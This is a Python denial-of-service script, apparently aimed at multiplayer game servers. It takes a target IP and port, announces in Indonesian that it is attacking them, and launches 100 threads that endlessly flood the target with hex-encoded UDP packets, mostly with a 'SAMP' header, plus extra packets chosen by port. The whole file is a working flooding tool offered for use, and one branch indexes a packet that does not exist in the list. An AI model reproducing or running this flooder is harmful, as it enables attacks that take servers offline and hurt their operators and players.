import socket
import struct
import codecs,sys
import threading
import random
import time
import os




ip = sys.argv[1]
port = sys.argv[2]
orgip =ip

Packets = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),
                       codecs.decode("081e62da","hex_codec"), 
                       codecs.decode("081e77da","hex_codec"),
                       codecs.decode("081e4dda","hex_codec"),
                       codecs.decode("021efd40","hex_codec"),
                       codecs.decode("081e7eda","hex_codec")
                       ]


print("Menyerang IP: %s Dan Port: %s"%(orgip,port))

            





class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM) 
                
                msg = Packets[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Packets[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Packets[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Packets[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Packets[7], (ip, int(port)))
                elif(int(port) == 8203):
                    sock.sendto(Packets[8], (ip, int(port)))                  
                elif(int(port) == 7375):
                    sock.sendto(Packets[9], (ip, int(port)))
                


if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print('#########################################################################')
         print('Apa?') 
         print('#########################################################################')
         print('\n\n')
         print('Apa  {}Liat-Liat? ='.format(orgip))
         pass
